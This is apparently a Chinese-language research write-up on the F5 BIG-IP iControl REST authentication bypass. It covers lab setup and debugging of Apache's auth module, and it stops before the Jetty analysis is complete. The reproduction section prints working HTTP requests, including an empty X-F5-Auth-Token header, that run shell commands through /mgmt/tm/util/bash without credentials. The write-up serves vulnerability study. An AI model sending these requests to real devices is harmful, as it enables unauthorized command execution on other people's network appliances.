## 概述

**官方信息**: [F5 Support Article](https://support.f5.com/csp/article/K03009991)

### 影响范围
| 产品 | 分支 | 已知受影响版本 | 修复版本 |
| --- | --- | --- | --- |
| BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM, Link Controller, PEM, SSLO) | 16.x | 16.0.0 - 16.0.1 | 16.1.0, 16.0.1.1* |
|  | 15.x | 15.1.0 - 15.1.2 | 15.1.2.1 |
|  | 14.x | 14.1.0 - 14.1.3 | 14.1.4* |
|  | 13.x | 13.1.0 - 13.1.3 | 13.1.3.6 |
|  | 12.x | 12.1.0 - 12.1.5 | 12.1.5.3** |
|  | 11.x | 无 | 不适用 |
| BIG-IQ Centralized Management | 8.x | 无 | 8.0.0 |
|  | 7.x | 7.1.0, 7.0.0 | 7.1.0.3, 7.0.0.2 |
|  | 6.x | 6.0.0 - 6.1.0 | 无 |
| F5OS | 1.x | 无 | 不适用 |
| Traffix SDC | 5.x | 无 | 不适用 |

**严重性**: 重大  
**CVSSv3 评分**: 9.8  
**受影响组件或功能**: iControl REST API

作为Java初学者，通过这个框架可以加深对Java的理解和各种分析方法的学习。推荐同样为Java新手的人阅读，经验丰富的开发者可以直接跳过。

## 环境搭建

在[F5下载网站](https://downloads.f5.com/)注册后，您可以成功下载虚拟机版的镜像文件。我下载了16.0.0版本的虚拟机OVF文件，并使用VMware直接导入。

**注意**：在注册账户时，请确保选择正确的国家。我最初选择了一个不知名的国家，在下载时遇到了软件禁运错误。重新注册一个账号后才解决了问题。

官网提供了[F5 REST API说明文档](https://cdn.f5.com/websites/devcentral.f5.com/downloads/icontrol-rest-api-user-guide-14-1-0.pdf)。要正常使用Web界面的各项功能，您需要一个有效的许可证密钥，但为了调试漏洞，这一步可以省略。

导入OVF文件后，系统会要求输入口令密码，默认是`root/default`。输入后，系统会提示更改默认口令。进入后，输入`config`命令可以更改虚拟机的IP地址。我将虚拟机的IP地址更改为`172.16.113.247`。

## 漏洞复现

1. **默认发送请求**：
   - 报错401，服务器为Apache。
   
2. **提供错误的Authorization认证头（admin:的Base64值）**：
   - 仍然报401，服务器为Apache。
   
3. **去掉Authorization认证头，添加X-F5-Auth-Token认证头**：
   - 仍然报401，但此时服务器为Jetty。
   
4. **同时存在X-F5-Auth-Token和Authorization认证头**：
   - 认证被绕过并执行命令。

通过这些测试包，我们可以得出结论：当存在X-F5-Auth-Token头时，Apache不会检查Basic认证头，而Jetty只检查Authorization中的用户名而不检查密码。接下来我们将尝试分析这一行为的原因。

## 分析

### Apache认证绕过漏洞分析

通过以下命令可以确认443端口是由httpd启动的，并且使用了Apache 2.4.6框架：

```bash
[root@localhost:NO LICENSE:Standalone] ~ # netstat -antp | grep :443
tcp6       0      0 :::443                  :::*                    LISTEN      4795/httpd
[root@localhost:NO LICENSE:Standalone] ~ # httpd -v
Server version: BIG-IP 67.el7.centos.5.0.0.12 (customized Apache/2.4.6) (CentOS)
Server built:   Jun 23 2020 16:37:41
```

进入httpd配置目录`/etc/httpd/`，查找与`/mgmt`相关的配置：

```bash
[root@localhost:NO LICENSE:Standalone] httpd # cd /etc/httpd/
[root@localhost:NO LICENSE:Standalone] httpd # grep -r "/mgmt" ./*
```

相关配置如下：

```apache
./run/config/httpd.conf:
RewriteRule ^/mgmt$ /mgmt/ [PT]
RewriteRule ^/mgmt(/vmchannel/.*) $1 [PT]
ProxyPass /mgmt/rpm !
ProxyPass /mgmt/job !
ProxyPass /mgmt/endpoint !
ProxyPass /mgmt/ http://localhost:8100/mgmt/ retry=0
ProxyPassReverse /mgmt/ http://localhost:8100/mgmt/
```

打开`https.conf`文件，找到以下相关部分：

```apache
# Access is restricted to traffic from 127.0.0.1
Require ip 127.0.0.1
Require ip 127.4.2.2
IncludeOptional /etc/httpd/conf/basic_auth*.conf
AuthName "Enterprise Manager"
AuthPAM_Enabled on
AuthPAM_ExpiredPasswordsSupport on
require valid-user
```

通过逆向分析`/usr/lib/httpd/modules/mod_auth_pam.so`文件，发现认证检查的具体代码都在`sub_5AF0`函数中。由于代码量较大，计划结合动态调试来搞清楚逻辑。

为了方便调试，以单线程方式重启httpd：

```bash
/usr/sbin/httpd -DTrafficShield -DAVRUI -DWebAccelerator -DSAM -X
```

通过查看指定进程号下的`maps`文件，可以知道`mod_auth_pam.so`的加载基地址：

```bash
[root@localhost:NO LICENSE:Standalone] config # cat /proc/$(ps -ef |grep "/usr/sbin/httpd -D" | grep -v "grep" | awk '{print $2}')/maps | grep mod_auth_pam.so | grep r-xp
563aa000-563b7000 r-xp 00000000 fd:06 168436                             /usr/lib/httpd/modules/mod_auth_pam.so
```

在`mod_auth_pam.so`的`loc_72D0`地址处下断点，即`hex(0x563aa000+0x72d0)=0x563b12d0`：

```gdb
(gdb) b *0x563b12d0
Breakpoint 1 at 0x563b12d0
```

然后发送数据包（注意，这个数据包里面是没有X-F5-Auth-Token头的）：

```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: 172.16.113.247
Authorization: Basic YWRtaW46
Connection: close
Content-type: application/json
Content-Length: 41
{"command":"run", "utilCmdArgs": "-c id"}
```

继续调试程序，当运行至`0x563b12ee`时，可以看到从头里面取出X-F5-Auth-Token返回值为0，会继续运行，获取其他参数的值。进而会使用从头Authorization中取到的值拿去`loc_5f28`做验证。自然，这里是通过不了认证的，会由Apache返回登录失败。

然而，如果重新发一个存在X-F5-Auth-Token头的数据包：

```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: 172.16.113.247
X-F5-Auth-Token:
Connection: close
Content-type: application/json
Content-Length: 41
{"command":"run", "utilCmdArgs": "-c id"}
```

认证校验这里则会奇怪地绕过对其它头信息的获取及校验，直接扔给本地8100端口处理。

### Jetty认证绕过漏洞分析

前面已经分析清楚，如果存在X-F5-Auth-Token则会绕过Apache的认证机制，绕过之后，相关信息会被转发给本地8100端口进行下一步处理。

查看8100端口是由哪个程序处理：

```bash
[root@localhost:NO LICENSE:Standalone] conf # netstat -antp | grep :8100
tcp6       0      0 127.0.0.1:8100          :::*                    LISTEN      21186/java
```

通过查看进程号21186的命令行参数，可以看到是Java进程：

```bash
[root@localhost:NO LICENSE:Standalone] cat /proc/21186/cmdline 
/usr/lib/jvm/jre/bin/java
-D java.util.logging.manager=com.f5.rest.common.RestLogManager
-D java.util.logging.config.file=/etc/restjavad.log.conf
...
```

基本都是`/usr/share/java/rest/`目录下的JAR包，所以反编译该目录下的所有JAR包。

通过动态调试，可以得知进程运行目录为`/var/service/restjavad`：

```bash
[root@localhost:NO LICENSE:Standalone] config # ls -al /proc/21186/
lrwxrwxrwx.   1 root root 0 May 16 16:51 cwd -> /var/service/restjavad
```

修改`/etc/bigstart/scripts/restjavad`文件，增加一行：

```bash
JVM_OPTIONS+=" -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8777"
```

通过以上步骤，可以进一步深入分析Java代码中的认证逻辑。